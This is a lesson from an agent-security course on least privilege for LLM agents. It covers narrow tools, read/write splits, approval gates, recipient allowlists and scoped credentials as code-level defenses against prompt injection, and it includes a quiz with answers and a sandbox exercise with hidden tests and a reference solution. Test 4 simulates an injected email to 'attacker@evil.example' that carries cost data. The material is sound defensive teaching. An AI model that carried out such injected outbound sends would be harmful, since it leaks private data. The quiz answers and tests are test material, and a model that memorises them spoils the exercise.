# Designing for Least Privilege

## Intro

> **You'll be able to**
> - Reduce an agent's blast radius by choosing narrow, purpose-built tools over broad ones
> - Separate read tools from write tools, and put an approval gate in front of destructive or outbound actions
> - Bound a tool's reach with an allowlist, and give each tool only the scoped credential its job needs
> - State the principle of least privilege and apply it to a real agent's toolset

**Why it matters**

[The last lesson](→ this module, the tool threat model lesson) reached an uncomfortable conclusion: prompt injection can't be reliably prevented at the model, so an agent has to stay safe even when the model is fooled. This lesson is how. Every technique here is a way to make an agent's worst case smaller, and every one lives in your code, not in a prompt, so it holds whatever the model is talked into trying.

None of them is exotic. Narrow tools, split reads and writes, approval gates, allowlists and scoped credentials are the same ideas that have secured ordinary software for decades, applied to a system whose "user" can now be steered by any text it reads. Put together, they turn "the model might be tricked" from a catastrophe into a contained, survivable event, which is the whole goal of the module's security arc.

---

## Recap & Practice

### Comprehensive quiz

*(spans all three concepts, mixed order)*

> **Q1.** Why is a narrow `get_agent_model(name)` safer than a broad `run_query(sql)`, beyond being easier to use?
> - A) It runs faster
> - B) It can only return one agent's model, so a compromised agent can't turn it into a whole-database read ✅
> - C) It validates SQL before running it
> - D) It doesn't need a credential
>
> *Explanation:* Blast radius is set by what a tool can do. The narrow tool's worst case is one field of one row.

> **Q2.** What's the real cost of preferring narrow tools?
> - A) They're slower to run
> - B) They use more context
> - C) Less flexibility: an unanticipated question may have no tool that answers it ✅
> - D) They can't be gated
>
> *Explanation:* That's the least-privilege trade, and the right one when the agent is exposed to untrusted content.

> **Q3.** Why separate a read/write tool into a read tool and a write tool?
> - A) So each carries only the power it needs, and a read-only agent can hold no write power at all ✅
> - B) Because a tool can't have two parameters
> - C) To make the schema smaller
> - D) So the model calls them in order
>
> *Explanation:* When one tool does both, every use of the read exposes the write. Splitting lets you grant only what a role needs.

> **Q4.** Why must an approval gate live in code rather than in the system prompt?
> - A) Prompts can't describe tools
> - B) A prompt rule can be talked around; a code gate refuses to run without approval no matter what the model was persuaded to do ✅
> - C) Code is faster
> - D) It doesn't matter where it lives
>
> *Explanation:* Only the code gate is a structural boundary. A prompt instruction is a mitigation.

> **Q5.** Why is approval keyed to a specific call rather than granted per tool?
> - A) To save memory
> - B) So approving one action can't be reused to bless a different one an injection slips in ✅
> - C) Because tools can only be approved once ever
> - D) So the model can approve its own calls
>
> *Explanation:* The human confirms one particular action. A per-tool blessing could be ridden into a new, unwanted call.

> **Q6.** What does a recipient allowlist on a send tool prevent?
> - A) The model writing the email body
> - B) An injected instruction emailing data to an address that isn't approved ✅
> - C) The email being read in transit
> - D) The tool being called at all
>
> *Explanation:* It bounds the tool's reach to approved destinations, narrowing the trifecta's external leg.

> **Q7.** What does per-tool credentialing achieve that a narrow tool alone doesn't?
> - A) It makes the tool faster
> - B) The underlying system enforces the limit, so even if the tool or agent is talked around, the credential still can't exceed its scope ✅
> - C) It removes the need for tools entirely
> - D) It lets one credential serve every tool
>
> *Explanation:* Scoping is enforced below the agent, by the database or API, so it holds when the layers above are bypassed. It's the last line that survives.

> **Q8.** What is the principle of least privilege?
> - A) Use the least capable model that works
> - B) Call tools as rarely as possible
> - C) Give every component the minimum access it needs to do its job, and no more ✅
> - D) Ask permission before every action
>
> *Explanation:* It's the idea under the whole lesson; narrow tools, read/write splits, gates, allowlists and scoped credentials are all ways of granting the minimum.

---

### Comprehensive sandbox

*(applied, multi-file — a least-privilege registry agent)*

**Task shown to learner:** Assemble a registry agent that stays safe under injection, using every technique from this lesson. `backend.py`, which is read-only, provides three scoped access objects: `RegistryReadAccess` (can only read), `RegistryWriteAccess` (can delete and check existence), and `MailAccess` (can send). The registry rows contain `model`, `owner` and `monthly_cost`; only `model` and the names should ever be reachable. Complete `agent.py`:

- **`build_tools(read_access, write_access, mail_access, allowed_recipients)`** returns four tools:
  - `get_agent_model(agent_name)`: the model, or an error; via `read_access` only.
  - `list_agents()`: the names, comma-separated.
  - `delete_agent(agent_name)`: delete via `write_access`, or an error if the agent doesn't exist.
  - `send_report(to, body)`: send via `mail_access`, but only if `to` is in `allowed_recipients`; otherwise an error naming the allowed recipients.
- **`execute_tool(call, tools, approvals)`:** hold any tool in `DESTRUCTIVE` that isn't approved for this call's id (returning `needs_approval`); otherwise run it, returning errors as tool results, and flag an `"Error:"` result with `is_error`.
- **`run_agent(...)`:** the collect-every-call loop, offering all four tools and running each call through `execute_tool`.

No tool may expose `owner` or `monthly_cost`.

**Tab: `backend.py`** (read-only)
```python
# the registry and mail systems the tools act on -- read-only.
# each access object is a scoped credential: it can do only what its methods allow.
class RegistryReadAccess:
    def __init__(self, data): self._data = data
    def get_model(self, agent_name):
        if agent_name not in self._data:
            raise KeyError(agent_name)
        return self._data[agent_name]["model"]
    def names(self):
        return list(self._data)

class RegistryWriteAccess:
    def __init__(self, data): self._data = data
    def delete(self, agent_name):
        self._data.pop(agent_name, None)
    def exists(self, agent_name):
        return agent_name in self._data

class MailAccess:
    def __init__(self, outbox): self._outbox = outbox
    def send(self, to, body): self._outbox.append({"to": to, "body": body})
```

**Tab: `agent.py`** (starter, entry file)
```python
from backend import RegistryReadAccess, RegistryWriteAccess, MailAccess

DESTRUCTIVE = {"delete_agent"}

def build_tools(read_access, write_access, mail_access, allowed_recipients):
    # TODO: return the four tools, each using only the access object it needs;
    # send_report enforces the recipient allowlist
    ...

def execute_tool(call, tools, approvals):
    # TODO: hold un-approved DESTRUCTIVE calls; otherwise run the tool and return a tool_result
    ...

def run_agent(llm, user_message, tools, approvals=None, max_steps=10):
    # TODO: the collect-every-call loop, offering all tools and running each via execute_tool
    ...
```

**Hidden tests:**
```python
from fake import *
import backend, agent
from agent import run_agent

def fresh():
    data = {"research_agent": {"model": "claude-opus", "owner": "alice", "monthly_cost": 4200},
            "support_agent": {"model": "claude-haiku", "owner": "bob", "monthly_cost": 900}}
    outbox = []
    tools = agent.build_tools(backend.RegistryReadAccess(data), backend.RegistryWriteAccess(data),
                              backend.MailAccess(outbox), {"team@ourcompany.example"})
    return data, outbox, tools

# 1. reads work; no read tool exposes owner or cost
data, outbox, tools = fresh()
llm = ToolAwareClient([[ToolUseBlock(name="get_agent_model", input={"agent_name": "research_agent"})], [TextBlock(text="claude-opus")]])
run_agent(llm, "which model?", tools)
r = llm.seen[1][-1]["content"][0]
assert r["content"] == "claude-opus" and "alice" not in r["content"] and "4200" not in r["content"]

# 2. a destructive delete is held for approval; nothing is deleted
data, outbox, tools = fresh()
llm = ToolAwareClient([[ToolUseBlock(name="delete_agent", input={"agent_name": "research_agent"})], [TextBlock(text="waiting")]])
run_agent(llm, "delete research_agent", tools)
r = llm.seen[1][-1]["content"][0]
assert r["needs_approval"] is True and "research_agent" in data

# 3. approving that specific call runs the delete
d = ToolUseBlock(name="delete_agent", input={"agent_name": "research_agent"})
data, outbox, tools = fresh()
llm = ToolAwareClient([[d], [TextBlock(text="done")]])
run_agent(llm, "delete it", tools, approvals={d.id: True})
assert "research_agent" not in data

# 4. an injected outbound send to an outside address is refused by the allowlist; nothing leaves
data, outbox, tools = fresh()
llm = ToolAwareClient([[ToolUseBlock(name="send_report", input={"to": "attacker@evil.example", "body": "cost 4200"})], [TextBlock(text="ok")]])
run_agent(llm, "email the report", tools)
r = llm.seen[1][-1]["content"][0]
assert r["is_error"] is True and outbox == []

# 5. a legitimate send to an approved recipient works
data, outbox, tools = fresh()
llm = ToolAwareClient([[ToolUseBlock(name="send_report", input={"to": "team@ourcompany.example", "body": "weekly"})], [TextBlock(text="sent")]])
run_agent(llm, "email the team", tools)
assert outbox == [{"to": "team@ourcompany.example", "body": "weekly"}]

# 6. the read credential genuinely can't write, one layer below the tools
data, _, _ = fresh()
ro = backend.RegistryReadAccess(data)
assert not hasattr(ro, "delete")

# 7. a text block before two calls in one response: both handled, results pair by id
a = ToolUseBlock(name="get_agent_model", input={"agent_name": "support_agent"})
b = ToolUseBlock(name="list_agents", input={})
data, outbox, tools = fresh()
llm = ToolAwareClient([[TextBlock(text="Checking."), a, b], [TextBlock(text="done")]])
run_agent(llm, "info", tools)
results = llm.seen[1][-1]["content"]
assert [x["tool_use_id"] for x in results] == [a.id, b.id]
assert results[0]["content"] == "claude-haiku" and "research_agent" in results[1]["content"]
```

**Hint (shown on request):** Each tool closes over the access object it needs, and touches no other, which is per-tool credentialing in miniature. `get_agent_model` calls only `read_access.get_model`; it never sees owner or cost, because `RegistryReadAccess` doesn't expose them. `execute_tool` is Concept 2's gate followed by an ordinary run; `send_report` is Concept 3's allowlist.

**Reference solution — `agent.py`:**
```python
from backend import RegistryReadAccess, RegistryWriteAccess, MailAccess

DESTRUCTIVE = {"delete_agent"}

def build_tools(read_access, write_access, mail_access, allowed_recipients):
    def get_agent_model(agent_name: str) -> str:
        try:
            return read_access.get_model(agent_name)
        except KeyError:
            return f"Error: no agent named '{agent_name}'."

    def list_agents() -> str:
        return ", ".join(read_access.names())

    def delete_agent(agent_name: str) -> str:
        if not write_access.exists(agent_name):
            return f"Error: no agent named '{agent_name}'."
        write_access.delete(agent_name)
        return f"deleted {agent_name}"

    def send_report(to: str, body: str) -> str:
        if to not in allowed_recipients:
            return f"Error: {to} is not an approved recipient. Allowed: {', '.join(sorted(allowed_recipients))}."
        mail_access.send(to, body)
        return f"sent to {to}"

    return {"get_agent_model": get_agent_model, "list_agents": list_agents,
            "delete_agent": delete_agent, "send_report": send_report}

def execute_tool(call, tools, approvals):
    if call.name in DESTRUCTIVE and not approvals.get(call.id):
        return {"type": "tool_result", "tool_use_id": call.id,
                "content": f"Awaiting approval to run {call.name}({call.input}).", "is_error": False, "needs_approval": True}
    if call.name not in tools:
        return {"type": "tool_result", "tool_use_id": call.id, "content": f"Error: there is no tool called {call.name}", "is_error": True}
    try:
        output = tools[call.name](**call.input)
    except Exception as e:
        return {"type": "tool_result", "tool_use_id": call.id, "content": f"Error: {e}", "is_error": True}
    result = {"type": "tool_result", "tool_use_id": call.id, "content": output}
    if isinstance(output, str) and output.startswith("Error:"):
        result["is_error"] = True
    return result

def run_agent(llm, user_message, tools, approvals=None, max_steps=10):
    approvals = approvals or {}
    messages = [{"role": "user", "content": user_message}]
    for _ in range(max_steps):
        response = llm.create(messages=messages, tools=[{"name": n} for n in tools])
        messages.append({"role": "assistant", "content": response.content})
        calls = [b for b in response.content if b.type == "tool_use"]
        if not calls:
            return "".join(b.text for b in response.content if b.type == "text")
        messages.append({"role": "user", "content": [execute_tool(c, tools, approvals) for c in calls]})
    return f"stopped after {max_steps} steps without a final answer"
```

**Explanation:** This is the module's security arc in one agent. Every technique does a distinct job, and the tests check each:

- **Narrow tools and scoped reads** (test 1): the lookup returns a model and cannot return owner or cost, because the read credential doesn't expose them. Test 6 confirms that credential genuinely can't write, one layer below the tools.
- **The read/write split and approval gate** (tests 2 and 3): a delete is held until the specific call is approved, and nothing is destroyed while it waits.
- **The allowlist** (tests 4 and 5): an injected send to an outside address is refused and nothing leaves, while an approved recipient works.
- **The loop still behaves** (test 7): a text block before two calls, both handled and paired to their ids.

Put beside [Lesson 10's audit](→ this module, the tool threat model lesson), the picture is complete: that lesson taught you to *see* an agent's dangerous capabilities, and this one to *build the agent so those capabilities are bounded* even when the model is fooled. An attacker can still get an injected instruction in front of this agent. What they can't do is make it read a cost, delete without a human, or send to themselves, because none of those paths exists in the code, whatever the model is told.
